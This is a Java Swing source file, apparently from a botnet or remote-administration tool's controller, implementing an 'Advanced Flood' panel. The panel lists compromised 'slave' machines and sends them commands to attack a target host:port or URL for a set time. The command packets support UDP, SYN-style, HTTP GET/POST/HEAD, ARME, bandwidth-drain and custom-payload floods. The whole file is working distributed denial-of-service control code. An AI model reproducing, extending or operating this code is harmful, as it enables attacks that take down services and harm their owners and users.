package com.redpois0n.ui.frames;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;

import javax.swing.BorderFactory;
import javax.swing.ButtonGroup;
import javax.swing.DefaultListModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JTree;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import com.redpois0n.Constants;
import com.redpois0n.Slave;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;
import com.redpois0n.ui.renderers.JTreeIconsRenderer;
import com.redpois0n.util.IconUtils;

@SuppressWarnings("serial")
public class FrameAdvancedFlood extends BaseFrame {

	private JPanel contentPane;
	public DefaultListModel<String> model = new DefaultListModel<String>();
	public List<Slave> slaves = new ArrayList<Slave>();
	public ButtonGroup bgroup = new ButtonGroup();
	private JTextField txtHost;
	private JTextField txtTime;
	public int selected = Constants.FLOOD_UDP;
	private JTextPane txtCode;

	public FrameAdvancedFlood(List<Slave> sla) {
		super();
		this.slaves = sla;

		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameAdvancedFlood.class.getResource("/icons/wall_edit.png")));
		setTitle("Advanced Flood - " + slaves.size() + " servers");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 647, 379);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();

		JLabel lblIpporthost = new JLabel("IP:Port/Host");

		JButton btnLaunch = new JButton("Launch");

		txtHost = new JTextField();
		txtHost.setText("127.0.0.1:80");
		txtHost.setColumns(10);

		txtTime = new JTextField();
		txtTime.setText("120");
		txtTime.setColumns(10);

		JLabel lblSeconds = new JLabel("Seconds");

		JTree tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.setRootVisible(false);
		tree.addTreeSelectionListener(new TreeSelectionListener() {
			public void valueChanged(TreeSelectionEvent arg0) {
				Object[] name = arg0.getPath().getPath();
				String val = getString(name);
				if (val.equalsIgnoreCase("udp")) {
					selected = Constants.FLOOD_UDP;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("random")) {
					selected = Constants.FLOOD_RANDOM;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("http post")) {
					selected = Constants.FLOOD_POST;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("http get")) {
					selected = Constants.FLOOD_GET;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("arme")) {
					selected = Constants.FLOOD_ARME;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("bandwidth drain")) {
					selected = Constants.FLOOD_DRAIN;
					txtCode.setEnabled(false);
				} else if (val.equalsIgnoreCase("custom")) {
					selected = Constants.FLOOD_CUSTOM;
					txtCode.setEnabled(true);
				} else if (val.equalsIgnoreCase("http head")) {
					selected = Constants.FLOOD_HEAD;
					txtCode.setEnabled(false);
				} else {
					selected = Constants.FLOOD_NONE;
					txtCode.setEnabled(false);
				}
			}
		});
		JTreeIconsRenderer renderer = new JTreeIconsRenderer();

		renderer.icons.put("udp", IconUtils.getIcon("udp_flood", true));
		renderer.icons.put("random", IconUtils.getIcon("ssyn_flood", true));
		renderer.icons.put("http post", IconUtils.getIcon("post_flood", true));
		renderer.icons.put("http get", IconUtils.getIcon("http_flood", true));
		renderer.icons.put("arme", IconUtils.getIcon("flood_arme", true));
		renderer.icons.put("bandwidth drain", IconUtils.getIcon("drain_flood", true));
		renderer.icons.put("custom", IconUtils.getIcon("custom_flood", true));
		renderer.icons.put("http head", IconUtils.getIcon("wallet"));

		tree.setCellRenderer(renderer);
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Flood") {
			{
				addNodes(this);
			}
		}));
		tree.setBorder(BorderFactory.createLineBorder(Color.gray));

		JScrollPane scrollPane_1 = new JScrollPane();
		scrollPane_1.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false).addComponent(tree, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 133, Short.MAX_VALUE)).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(137).addComponent(lblIpporthost).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addComponent(lblSeconds).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtTime, GroupLayout.PREFERRED_SIZE, 77, GroupLayout.PREFERRED_SIZE)).addComponent(txtHost, GroupLayout.PREFERRED_SIZE, 170, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnLaunch, GroupLayout.PREFERRED_SIZE, 111, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createSequentialGroup().addPreferredGap(ComponentPlacement.RELATED).addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 481, GroupLayout.PREFERRED_SIZE))).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false).addGroup(gl_contentPane.createSequentialGroup().addComponent(tree, GroupLayout.PREFERRED_SIZE, 147, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 185, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 279, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING, false).addComponent(btnLaunch, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtHost, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblIpporthost)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtTime, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblSeconds)))))).addGap(11)));

		txtCode = new JTextPane();
		txtCode.setText("HEAD / HTTP/1.1\r\nHost: asd\r\nAccept-Encoding: gzip\r\nConnection: close");
		txtCode.setEnabled(false);
		txtCode.setToolTipText("Custom text to send");
		scrollPane_1.setViewportView(txtCode);

		JList<String> list = new JList<String>(model);
		list.setToolTipText("Selected servers");
		scrollPane.setViewportView(list);
		contentPane.setLayout(gl_contentPane);
		loadSlaves();

		btnLaunch.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (!validated()) {
					JOptionPane.showMessageDialog(null, "Input valid values, some methods do\nIP:Port, others do Host\nHover on the buttons to find out", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}

				PacketBuilder packet = null;

				if (selected == Constants.FLOOD_DRAIN) {
					packet = new PacketBuilder(Header.FLOOD_DRAIN);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_RANDOM) {
					packet = new PacketBuilder(Header.FLOOD_SSYN);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_UDP) {
					packet = new PacketBuilder(Header.FLOOD_UDP);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_POST) {
					packet = new PacketBuilder(Header.FLOOD_HTTP_POST);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_GET) {
					packet = new PacketBuilder(Header.FLOOD_HTTP_GET);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_ARME) {
					packet = new PacketBuilder(Header.FLOOD_ARME);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
				} else if (selected == Constants.FLOOD_CUSTOM) {
					packet = new PacketBuilder(Header.FLOOD_CUSTOM);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
					packet.add("U " + txtCode.getText().trim());
				} else if (selected == Constants.FLOOD_HEAD) {
					packet = new PacketBuilder(Header.FLOOD_HTTP_HEAD);
					packet.add(txtHost.getText().trim());
					packet.add(Integer.parseInt(txtTime.getText().trim()));
					packet.add("U " + txtCode.getText().trim());
				}
				for (Slave sl : slaves) {
					sl.addToSendQueue(packet);
				}
				JOptionPane.showMessageDialog(null, "Launched on " + txtHost.getText().trim() + "\nfor " + txtTime.getText().trim() + " seconds", "Success", JOptionPane.INFORMATION_MESSAGE);
			}
		});
		btnLaunch.setIcon(new ImageIcon(FrameAdvancedFlood.class.getResource("/icons/wall__go.png")));
	}

	public void loadSlaves() {
		for (Slave sl : slaves) {
			model.add(model.size(), sl.getIP() + " - " + sl.getComputerName());
		}
	}

	public String getString(Object[] obj) {
		if (obj.length == 2) {
			String s = obj[1].toString();
			return s;
		} else {
			return null;
		}
	}

	public void addNodes(DefaultMutableTreeNode root) {
		root.add(new DefaultMutableTreeNode("UDP"));
		root.add(new DefaultMutableTreeNode("Random"));
		root.add(new DefaultMutableTreeNode("HTTP Post"));
		root.add(new DefaultMutableTreeNode("HTTP Get"));
		root.add(new DefaultMutableTreeNode("HTTP Head"));
		root.add(new DefaultMutableTreeNode("ARME"));
		root.add(new DefaultMutableTreeNode("Bandwidth Drain"));
		root.add(new DefaultMutableTreeNode("Custom"));
	}

	public boolean validated() {
		try {
			if (selected == Constants.FLOOD_NONE) {
				return false;
			}
			Integer.parseInt(txtTime.getText().trim());
			if (selected == Constants.FLOOD_DRAIN || selected == Constants.FLOOD_GET || selected == Constants.FLOOD_POST) {
				parseUrl();
			} else if (selected == Constants.FLOOD_UDP || selected == Constants.FLOOD_RANDOM) {
				String[] str = txtHost.getText().trim().split(":");
				if (str.length != 2) {
					throw new Exception("No port");
				}
			}
			return true;
		} catch (Exception ex) {
			return false;
		}
	}

	public void parseUrl() throws Exception {
		if (!txtHost.getText().trim().startsWith("http://")) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Flood", JOptionPane.ERROR_MESSAGE);
			return;
		}
	}
}
